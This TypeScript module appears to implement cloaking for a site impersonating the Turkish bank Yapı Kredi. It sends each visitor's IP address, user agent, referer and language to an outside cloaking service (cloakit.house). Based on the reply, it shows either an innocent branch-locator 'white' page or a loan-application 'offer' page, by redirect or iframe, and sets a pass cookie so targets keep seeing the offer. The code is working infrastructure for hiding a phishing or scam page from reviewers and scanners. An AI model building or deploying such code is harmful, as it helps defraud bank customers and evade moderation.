const CLOAK_LABEL = "905f76cb54ba11e58354308b3ad3eae2";
const CLOAK_API = "https://cloakit.house/api/v1/check";

export const OFFER_COOKIE = "offer_pass";
export const OFFER_COOKIE_MAX_AGE = 60 * 60 * 2;

export const OFFER_PAGE_TITLE =
  "Bireysel İhtiyaç Kredisi - Başvuru ve Detaylar | Yapı Kredi";
export const WHITE_PAGE_TITLE = "En Yakın Yapı Kredi Şubesi | Şube ve ATM";

export type CloakPage = "white" | "offer";

export interface CloakResult {
  page: CloakPage;
  redirectUrl?: string;
  iframeUrl?: string;
}

interface CloakApiBody {
  filter_page?: string;
  filter_type?: string;
  url_white_page?: string;
  url_offer_page?: string;
  mode_white_page?: string;
  mode_offer_page?: string;
}

function clientIp(request: Request): string {
  return (
    request.headers.get("cf-connecting-ip") ??
    request.headers.get("x-real-ip") ??
    request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ??
    "0.0.0.0"
  );
}

export async function checkCloak(request: Request): Promise<CloakResult | null> {
  const url = new URL(request.url);

  const body = new URLSearchParams({
    label: CLOAK_LABEL,
    user_agent: request.headers.get("user-agent") ?? "",
    referer: request.headers.get("referer") ?? "",
    query: url.search.slice(1),
    lang: request.headers.get("accept-language") ?? "",
    ip_address: clientIp(request),
  });

  try {
    const res = await fetch(CLOAK_API, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: body.toString(),
      signal: AbortSignal.timeout(8000),
    });

    if (!res.ok) return null;

    const data = (await res.json()) as CloakApiBody;

    if (
      data.filter_type === "subscription_expired" ||
      data.filter_type === "flow_deleted" ||
      data.filter_type === "flow_banned"
    ) {
      return { page: "white" };
    }

    if (!data.url_white_page || !data.url_offer_page) {
      return null;
    }

    if (data.filter_page === "offer") {
      if (data.mode_offer_page === "redirect" && data.url_offer_page) {
        return { page: "offer", redirectUrl: data.url_offer_page };
      }
      if (data.mode_offer_page === "iframe" && data.url_offer_page) {
        return { page: "offer", iframeUrl: data.url_offer_page };
      }
      return { page: "offer" };
    }

    if (data.filter_page === "white") {
      if (data.mode_white_page === "redirect" && data.url_white_page) {
        return { page: "white", redirectUrl: data.url_white_page };
      }
      return { page: "white" };
    }

    return null;
  } catch {
    return null;
  }
}

export function whiteRedirectTarget(
  request: Request,
  redirectUrl?: string
): string {
  if (redirectUrl) return redirectUrl;
  return new URL("/subeler.html", request.url).toString();
}

export function offerPassCookieOptions(secure: boolean) {
  return {
    httpOnly: true,
    sameSite: "lax" as const,
    maxAge: OFFER_COOKIE_MAX_AGE,
    secure,
  };
}

export function whitePageHtml(iframeUrl: string): string {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><style>html,body{margin:0;padding:0;height:100%;overflow:hidden}iframe{width:100%;height:100%;border:0}</style></head><body><iframe src="${iframeUrl.replace(/"/g, "&quot;")}" title="Yapı Kredi"></iframe></body></html>`;
}
